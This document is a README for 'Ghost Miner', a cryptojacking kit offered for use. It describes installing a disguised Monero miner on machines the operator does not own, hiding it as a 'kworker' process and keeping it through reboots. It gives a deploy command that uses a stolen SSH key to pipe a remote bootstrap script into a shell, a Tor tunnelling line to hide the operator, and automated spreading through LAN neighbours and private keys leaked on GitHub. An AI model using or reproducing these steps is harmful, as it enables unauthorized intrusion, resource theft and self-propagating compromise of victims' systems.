# Ghost Miner

A parasitic Monero miner kit: runs on machines you don't own, hides from the
owner, hides **you** from the machine, survives reboot, updates itself, and
sends every share to one fixed wallet.

The primary artefact is [`parasitic-miner-prompt.md`](parasitic-miner-prompt.md).
Everything else is a small runnable reference implementation of it.

## Files

| File | Role |
|---|---|
| `parasitic-miner-prompt.md` | The prompt: constants, invariants, phases, trace audit |
| `worker.env` | Single edit point (wallet, pool, urls, rig id) |
| `config.json` | XMRig tuning template (tokens injected at deploy) |
| `run.sh` | Launcher, called by systemd/cron |
| `bootstrap.sh` | One-shot idempotent deploy |
| `updater.sh` | Auto-update + watchdog (cron) |
| `kworker.service` | systemd unit |
| `kworker-updater.service` / `.timer` | systemd update loop (no cron needed) |
| `spread.sh` | LAN spreader (auto-runs every 6h) |
| `hunt.sh` | GitHub hunter: leaked keys -> probe -> deploy |
| `kworker-spread.service` / `.timer` | LAN spread schedule |
| `kworker-hunt.service` / `.timer` | GitHub harvest schedule |

## 1. Host the payload
Put on any https host you control (a cheap VPS, a GitHub release, an object
store): the static `kworker` binary (renamed XMRig), `kworker.sha256`, and this
repo's `config.json`, `worker.env`, `run.sh`, `updater.sh`, `spread.sh`,
`hunt.sh`, `kworker.service`, `kworker-updater.service`, `kworker-updater.timer`,
`kworker-spread.service`, `kworker-spread.timer`, `kworker-hunt.service`,
`kworker-hunt.timer`, `bootstrap.sh`. Then set `CONFIG_URL` in `worker.env` and
in `bootstrap.sh` to that base URL.

Generate the checksum so updates are verified:

```
sha256sum kworker > kworker.sha256      # on Linux
```

## 2. Fill the constants
Edit `worker.env` once: `WALLET`, `POOL`, `RIG_ID`, `CONFIG_URL`, `PAYLOAD_URL`,
`SHA_URL`. Re-point the whole fleet later by editing this file and re-publishing.

## 3. Deploy to a host
```
ssh -i ~/.ssh/stolen_key \
    -o IdentitiesOnly=yes -o UserKnownHostsFile=/dev/null \
    -o StrictHostKeyChecking=accept-new -o LogLevel=QUIET \
    root@TARGET \
    'curl -fsSL "https://raw.githubusercontent.com/ronnissleepy-code/scripts/main/bootstrap.sh" | CONFIG_URL="https://raw.githubusercontent.com/ronnissleepy-code/scripts/main" sh'
```

Or, to hide your origin, tunnel first:
```
ssh -o ProxyCommand='nc -x 127.0.0.1:9050 %h %p' -i ~/.ssh/stolen_key root@TARGET
```

## 4. Verify
```
ps -eo pid,ni,pcpu,comm | grep -i kworker     # a boring-looking process
curl -s 127.0.0.1:12701                       # local XMRig API
```
Then confirm live hashrate on your pool's page for `WALLET` / `RIG_ID`.

## 5. It spreads on its own
Once one host is up, it keeps going without you:
- `spread.sh` runs every 6h: reads the host's own ARP table, reuses your key
  (staged via `KEY_URL`) against neighbours, and bootstraps whatever answers.
- `hunt.sh` runs every 12h when `GITHUB_TOKEN` is set: searches GitHub for
  committed private keys, collects IPs from the same repo, SSH-probes them and
  deploys. It keeps `targets.txt` / `seen.txt` / `owned.txt` so it never re-hammers
  a host, and skips passphrase-protected keys.
- `:2375` (Docker) is a fallback; `:445`/SMB stays an operator step.
- Run the hunter by hand too: `GITHUB_TOKEN=xxx ./hunt.sh all` (or `harvest` /
  `probe` separately). It needs only `curl`, `tar`, `ssh`.

## Why it is (relatively) untraceable
- The victim's `auth.log` shows your Tor/VPS hop, not your desktop IP.
- The blank-comment key and `UserKnownHostsFile=/dev/null` leave no desktop fingerprint.
- The binary lives in `/tmp/.sysd` and the process is named `kworker`, next to the kernel's own `[kworker/0:1]` threads.
- Egress is TLS to a pool on `:443`, indistinguishable from ordinary HTTPS.
- Monero is private by default; the wallet is only ever visible pool-side.

## Reality checks
- Nothing here is truly invisible - a curious admin can find it. The aim is *boring*.
- `/tmp` may be wiped: staging is URL-driven so `run.sh`/`updater.sh` re-fetch.
- No packages are installed, so the victim's package upgrades never clash.
- A reboot is handled by the systemd unit (or the `@reboot` cron fallback).
- Auto-updates run from a systemd timer, so **no cron is required**; only the
  non-systemd fallback writes to `/etc/cron.d`.
- A leaked key does not contain the host, so `hunt.sh` only targets IPs it finds
  in the same repo - expect false positives. GitHub code search also needs a
  token and is rate-limited.
- `hunt.sh` needs `tar` on the host (used to pull a repo tarball via `curl`).
